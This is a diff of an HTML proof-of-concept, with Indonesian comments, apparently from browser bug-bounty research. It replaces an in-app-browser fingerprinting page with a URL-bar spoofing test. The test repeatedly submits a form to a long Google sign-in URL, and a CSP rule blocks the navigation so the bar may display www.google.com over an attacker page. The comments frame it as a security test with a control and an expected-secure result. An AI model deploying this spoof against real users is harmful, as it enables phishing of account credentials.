@@ -1,35 +1,19 @@
-<!-- 10 | 2026 · IN-APP BROWSER / WebView — di sinilah kelas ini masih benar-benar hidup | [NO-CLICK]
-     Ini yang paling sering dilewatkan, dan justru yang paling membayar.
-     Chrome desktop sudah menutup keluarga nav-timing di tingkat arsitektur. WebView dan
-     in-app browser TIDAK. Mereka: sering tertinggal beberapa versi, sering menggambar
-     bar sendiri (bukan omnibox asli), sering hanya menampilkan HOST tanpa skema, sering
-     menyembunyikannya saat digulir - dan aplikasi induknya punya program bounty SENDIRI
-     (Meta, TikTok, LINE, Telegram, dan seterusnya).
-     Jadi PoC yang "gagal" di Chrome desktop belum tentu gagal - ia mungkin diuji di tempat
-     yang salah. File ini memberitahu kamu sedang berada di mana.
-     CARA UJI  kirim link file ini ke dirimu sendiri lewat DM aplikasi itu, buka DARI DALAM
-     aplikasinya, baca laporannya. Lalu buka 1.html dan 3.html dari tempat yang sama.
-     EXPECTED-SECURE  in-app browser tetap menampilkan host penuh yang tak bisa ditulisi halaman. -->
-<pre id=g style="font:12px/1.7 monospace"></pre>
-<p style="font:13px system-ui">Sesudah membaca ini, buka <a href="1.html">1.html</a> dan <a href="3.html">3.html</a> dari dalam aplikasi yang sama.</p>
+<!doctype html><meta charset=utf-8>
+<meta http-equiv="Content-Security-Policy" content="form-action 'none'">
+<!-- PREDIKAT: bar/label melukis www.google.com sementara dokumen tetap milikku
+     ORACLE: klik go -> screenshot bar + panel REAL; console mencatat pelanggaran CSP = bukti nav dibunuh LOKAL
+     CONTROL: hapus <meta ...Content-Security-Policy...> -> nav commit normal
+     EXPECTED-SECURE: bar tak pernah melukis target yang navigasinya diblok kebijakan -->
+<h2>attacker document (tetap terlihat)</h2>
+<form id=f method=GET target=_self></form>
+<button onclick="go()">go</button>
+<pre id=p></pre>
 <script>
-var ua = navigator.userAgent;
-var apps = [['Instagram', /Instagram/i], ['Facebook', /FBAN|FBAV|FB_IAB/i], ['TikTok', /BytedanceWebview|musical_ly|Trill/i],
-['LINE', /\bLine\//i], ['Telegram', /Telegram/i], ['Twitter/X', /Twitter/i], ['Snapchat', /Snapchat/i],
-['WhatsApp', /WhatsApp/i], ['Android WebView', /; wv\)/i], ['iOS WKWebView', /iPhone|iPad/i]];
-var hit = apps.filter(function (a) { return a[1].test(ua); }).map(function (a) { return a[0]; });
-g.textContent =
-  'REAL ORIGIN  : ' + location.href +
-  '\nterdeteksi   : ' + (hit.length ? hit.join(', ') : 'browser biasa (bukan in-app)') +
-  '\nstandalone   : ' + (navigator.standalone === undefined ? 'n/a' : navigator.standalone) +
-  '\nchrome tegak : ' + (outerHeight - innerHeight) + 'px' +
-  '\nviewport     : ' + innerWidth + 'x' + innerHeight + '  screen ' + screen.width + 'x' + screen.height +
-  '\nUA           : ' + ua +
-  '\n\nSEKARANG LIHAT KE ATAS LAYAR dan catat:' +
-  '\n  1. ada teks URL?  penuh, atau host saja, atau kosong?' +
-  '\n  2. skema (https) ditampilkan?  gembok ada?' +
-  '\n  3. bar-nya hilang saat digulir?' +
-  '\n  4. bisakah bar itu ditekan untuk melihat URL lengkap?' +
-  '\n\nJawaban "host saja" / "hilang saat gulir" / "tidak bisa ditekan"' +
-  '\n= permukaan hidup, dan pemiliknya PUNYA program bounty sendiri.';
+const T = 'https://www.google.com/accounts/' + 'signin/'.repeat(40) + 'identifier';
+f.action = T;
+let n = 0;
+function go(){ if (n++ < 6) f.submit(); paint(); }
+function paint(){ p.textContent = 'REAL: ' + location.href + '\nattempts: ' + n + '\nCSP form-action = pembunuh nav'; }
+addEventListener('securitypolicyviolation', e => { p.textContent += '\nCSP blocked: ' + e.violatedDirective; });
+paint();
 </script>
